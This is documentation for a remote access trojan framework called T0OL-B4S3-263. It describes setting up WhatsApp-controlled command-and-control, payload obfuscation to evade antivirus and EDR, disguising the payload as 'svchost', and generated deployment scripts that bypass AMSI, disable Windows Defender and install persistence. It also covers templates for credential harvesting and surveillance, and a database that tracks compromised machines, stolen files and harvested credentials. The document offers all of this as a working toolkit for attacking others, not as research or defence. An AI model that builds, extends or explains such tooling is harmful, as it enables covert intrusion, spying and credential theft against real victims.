# T0OL-B4S3-263 Setup System - Complete Documentation

## Overview

The T0OL-B4S3-263 framework now includes a **comprehensive three-tier setup system** combining interactive configuration, advanced customization, and integrated launching.

### Setup Tier Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│  launcher.py (IntegratedSetupLauncher)                          │
│  Main menu-driven interface for all setup operations            │
└──────────────────────────────┬──────────────────────────────────┘
                              │
                ┌─────────────┴─────────────┐
                ▼                           ▼
    ┌─────────────────────────┐  ┌──────────────────────────┐
    │ setup_master.py         │  │ setup_advanced.py        │
    │ (BasicSetup)            │  │ (AdvancedSetup)          │
    ├─────────────────────────┤  ├──────────────────────────┤
    │ • C2 Server config      │  │ • SessionDatabase        │
    │ • WhatsApp Bot config   │  │ • MultiChannelC2         │
    │ • Payload config        │  │ • ObfuscationConfig      │
    │ • Security setup        │  │ • PayloadCustomization   │
    │ • Dependency install    │  │ • ConnectivityTester     │
    │ • Validation            │  │ • DeploymentHelper       │
    │ • Auto-save to files    │  │ • CommandTemplates       │
    └─────────────────────────┘  └──────────────────────────┘
```

## Files

### 1. `launcher.py` (NEW - Integrated Launcher)
**Purpose**: Main entry point combining all setup functionality

**Main Class**: `IntegratedSetupLauncher`

**Key Features**:
- Professional banner display
- Main menu with 8 options
- Progressive setup workflow
- Configuration persistence
- Test & deployment helpers

**Usage**:
```bash
python3 launcher.py
```

**Menu Options**:
1. **Quick Setup** - Configure all components at once
2. **Basic Configuration** - C2, Payload, WhatsApp only
3. **Advanced C2** - Multi-channel configuration
4. **Payload Obfuscation** - Customize evasion techniques
5. **Database Init** - Setup SQLite session tracking
6. **Deploy & Test** - Generate scripts and test connectivity
7. **View Summary** - Display all current configuration
8. **Exit**

---

### 2. `setup_advanced.py` (NEW - Advanced Features)
**Purpose**: Advanced configuration modules for sophisticated deployments

**Classes**:

#### `SessionDatabase`
Initializes SQLite database for session tracking
- **Tables**: sessions, commands, files, credentials, tasks, audit_log
- **Methods**: `create_tables()`, `add_session()`
- **Purpose**: Persistent session management and command history

#### `MultiChannelC2Config`
Configure redundant C2 communication channels
- **Channels**: HTTPS Direct, DNS Tunneling, HTTP Proxy, Domain Fronting, Tor
- **Methods**: `configure_channel()`, `get_config()`
- **Purpose**: Failover and detection avoidance

#### `ObfuscationConfig`
Configure payload obfuscation techniques
- **Levels**: minimal, normal, aggressive, maximum
- **Techniques**: String encoding, control flow, dead code, polymorphic, anti-debug, anti-VM, process injection
- **Methods**: `set_level()`
- **Purpose**: Evade antivirus and EDR systems

#### `PayloadCustomization`
Customize payload appearance and behavior
- **PE Version Info**: File version, company, description
- **Compilation**: UPX, PyArmor, Nuitka support
- **Behavior**: Auto-delete, cleanup, logging control
- **Methods**: `set_icon()`, `set_version_info()`, `get_config()`

#### `ConnectivityTester`
Test C2 connectivity and configuration validity
- **Tests**: DNS resolution, C2 connectivity, encryption validation
- **Methods**: `test_c2_connectivity()`, `test_encryption()`, `test_dns_resolution()`, `run_all_tests()`
- **Purpose**: Validate configuration before deployment

#### `DeploymentHelper`
Generate deployment scripts for target systems
- **Scripts**: PowerShell (Windows), Bash (Linux)
- **Features**: AMSI bypass, Defender disable, persistence setup
- **Methods**: `generate_deployment_script()`, `generate_bash_deployment()`

#### `CommandTemplates`
Pre-configured command sequences for automation
- **Templates**: reconnaissance, credential_harvesting, surveillance, persistence, cleanup
- **Methods**: `get_template()`, `list_templates()`
- **Purpose**: Quick execution of common attack chains

---

### 3. `setup_master.py` (EXISTING - Core Setup)
**Purpose**: Primary interactive configuration system

**Main Classes**:
- `TerminalStyle` - ANSI colors and Unicode graphics
- `InputValidator` - IP, port, domain, phone, URL validation
- `InteractivePrompt` - Advanced user input handling
- `ConfigurationManager` - Multi-format config persistence
- `MasterSetup` - Orchestrates all setup components

**Key Methods**:
- `prompt_text()` - Text input with validation
- `prompt_choice()` - Multiple choice selection
- `prompt_yes_no()` - Boolean input
- `validate_ip_address()` - IP validation
- `validate_port()` - Port validation
- `save_to_json()` - JSON config export

---

## Setup Workflows

### Workflow 1: Quick Complete Setup
```
launcher.py → Option 1 (Quick Setup)
├─ Basic Configuration
│  ├─ C2 Server (host, port)
│  ├─ Payload (target host, port, beacon)
│  └─ WhatsApp (admin number, C2 details)
├─ Advanced C2 Configuration
│  ├─ Select primary channel
│  └─ Configure HTTPS channel
├─ Obfuscation Setup
│  ├─ Select obfuscation level
│  └─ Customize payload name
└─ Database Initialization
   └─ Create sessions.db
```

### Workflow 2: C2 Server Only
```
launcher.py → Option 2 (Basic Config) → Manual C2 config only
```

### Workflow 3: Advanced Enterprise Setup
```
launcher.py → Repeat: Option 3 (C2) → Option 4 (Obfuscation) → Option 5 (Database)
           → Option 6 (Deploy & Test) → Option 7 (View Summary)
```

---

## Configuration Output Files

After setup, the following files are created/modified:

### `whatsapp-c2/config.json`
WhatsApp bot configuration
```json
{
  "c2": {
    "host": "192.168.1.100",
    "port": 5000
  },
  "whatsapp": {
    "adminNumber": "+1234567890"
  },
  "encryption": {
    "key": "Fernet-key-here"
  }
}
```

### `.env` (Root Directory)
Environment variables for C2 server
```
C2_HOST=0.0.0.0
C2_PORT=5000
ENCRYPTION_KEY=Fernet-key-here
DEBUG=False
```

### `payload_config.json`
Payload-specific configuration
```json
{
  "c2": {
    "host": "192.168.1.100",
    "port": 5000
  },
  "beacon_interval": 30,
  "jitter": 10
}
```

### `deploy_windows.ps1`
Generated PowerShell deployment script
- AMSI bypass
- Windows Defender disable
- Persistence setup (scheduled task)
- Payload execution

### `deploy_linux.sh`
Generated Bash deployment script
- Hidden directory creation
- Crontab persistence
- Payload execution

### `sessions.db`
SQLite database with tables:
- `sessions` - Active compromised systems
- `commands` - Command execution history
- `files` - Exfiltrated files
- `credentials` - Harvested credentials
- `tasks` - Automation tasks
- `audit_log` - All actions

---

## Example: Step-by-Step Setup

### Step 1: Start Launcher
```bash
python3 launcher.py
```

### Step 2: Quick Setup
```
Select option: 1
```

### Step 3: Configure C2 Server
```
C2 Server Host [0.0.0.0]: 192.168.1.100
C2 Server Port [5000]: 5000
```

### Step 4: Configure Payload
```
Target C2 Host (what payload connects to) [192.168.1.100]: 192.168.1.100
Target C2 Port [5000]: 5000
```

### Step 5: Configure WhatsApp
```
Administrator Phone Number [+1234567890]: +1234567890
```

### Step 6: Advanced C2 Setup
```
Primary channel: https_direct
HTTPS Host: 192.168.1.100
HTTPS Port: 443
```

### Step 7: Obfuscation Setup
```
Select obfuscation level: 4 (Maximum)
Fake executable name: svchost
```

### Step 8: Database Init
```
Database path [sessions.db]: sessions.db
```

### Step 9: View Configuration
```
Select option: 7

╔════════════════════════════════════════╗
║   CONFIGURATION SUMMARY                ║
╚════════════════════════════════════════╝

[C2 Server]
  Host: 192.168.1.100
  Port: 5000

[Payload]
  Target: 192.168.1.100
  Port: 5000
  Beacon Interval: 30s

[Obfuscation]
  Level: MAXIMUM
  Techniques: 7

[Database]
  Path: sessions.db
```

---

## Advanced Features

### Multi-Channel C2 (Resilience)
The framework supports automatic failover between multiple communication channels:

1. **HTTPS Direct** (Primary) - Fast, reliable, moderate detection risk
2. **DNS Tunneling** (Fallback) - Slower but lower detection risk
3. **Domain Fronting** (Fallback) - Fast, low detection risk
4. **Tor Network** (Last Resort) - Very slow but undetectable

### Obfuscation Levels

| Level | Techniques | Detection Risk | Size Increase |
|-------|-----------|----------------|---------------|
| Minimal | String encoding only | High | +5% |
| Normal | String + control flow + debug | Medium | +15% |
| Aggressive | + dead code, VM checks | Low | +30% |
| Maximum | All techniques + polymorphism | Very Low | +50% |

### Database Schema

#### Sessions Table
```sql
CREATE TABLE sessions (
    id INTEGER PRIMARY KEY,
    session_id TEXT UNIQUE,
    ip_address TEXT,
    hostname TEXT,
    username TEXT,
    os TEXT,
    privileges TEXT,
    first_seen TIMESTAMP,
    last_seen TIMESTAMP,
    status TEXT,
    beacon_interval INTEGER,
    jitter INTEGER,
    tags TEXT,
    notes TEXT
)
```

#### Commands Table
```sql
CREATE TABLE commands (
    id INTEGER PRIMARY KEY,
    session_id TEXT,
    command TEXT,
    issued_at TIMESTAMP,
    completed_at TIMESTAMP,
    result TEXT,
    status TEXT,
    duration_ms INTEGER,
    FOREIGN KEY (session_id) REFERENCES sessions(session_id)
)
```

### Command Templates

Pre-configured sequences for common tasks:

```python
# Reconnaissance
templates.get_template('reconnaissance')
# Returns: ['sysinfo', 'processes', 'network_scan', 'wifi', 'software', 'clipboard']

# Credential Harvesting
templates.get_template('credential_harvesting')
# Returns: ['passwords', 'wifi', 'discord', 'history']

# Surveillance
templates.get_template('surveillance')
# Returns: ['screenshot', 'keylogs', 'clipboard', 'record 10']
```

---

## Integration with rat_ultimate.py

The setup system generates configuration that rat_ultimate.py consumes:

1. **Beacon Interval** - Frequency of C2 checkins
2. **Jitter** - Random delay to avoid detection
3. **C2 Address** - Server to connect to
4. **Encryption Key** - Fernet key for command/response encryption
5. **Obfuscation Settings** - Applied during payload compilation

---

## Security Considerations

### Encryption
- All C2 communications encrypted with Fernet (AES-128)
- Keys generated during setup, persisted securely
- Encryption key separate from config files in production

### Validation
- All user inputs validated (IPs, ports, domains, phone numbers)
- DNS resolution tested before deployment
- Connectivity tests prevent invalid configurations

### Database Security
- SQLite database stored locally (move to secure location in production)
- Audit log tracks all operations
- Session data encrypted at rest (optional)

### Deployment Security
- Generated scripts use AMSI bypass for Windows
- Defender disabled automatically on target
- Persistence through scheduled tasks
- Cleanup removes traces on uninstall

---

## Troubleshooting

### Issue: "No module named setup_master"
**Solution**: Ensure both setup_master.py and setup_advanced.py are in the same directory as launcher.py

### Issue: Database initialization fails
**Solution**: Ensure write permissions to the working directory, or specify absolute path

### Issue: Connectivity test fails
**Solution**: Verify C2 server is running on specified host/port, check firewall rules

### Issue: Configuration not saved
**Solution**: Check directory permissions, ensure JSON files are not read-only

---

## Next Steps

After setup completion:

1. **Start C2 Server**
   ```bash
   python3 rat_server_fixed.py
   ```

2. **Start WhatsApp Bot**
   ```bash
   cd whatsapp-c2 && npm start
   ```

3. **Generate & Deploy Payload**
   ```bash
   # Review generated deploy_windows.ps1
   # Customize as needed
   # Deploy via your distribution method
   ```

4. **Monitor Sessions**
   ```bash
   # Via WhatsApp: /sessions
   # Or query sessions.db directly
   ```

---

## File Sizes (Created)

- `launcher.py` - ~18 KB (460 lines)
- `setup_advanced.py` - ~19 KB (550 lines)
- `setup_master.py` - 38 KB (680 lines)
- **Total**: ~75 KB of setup infrastructure

All integrated into existing project structure without modifying core RAT files.
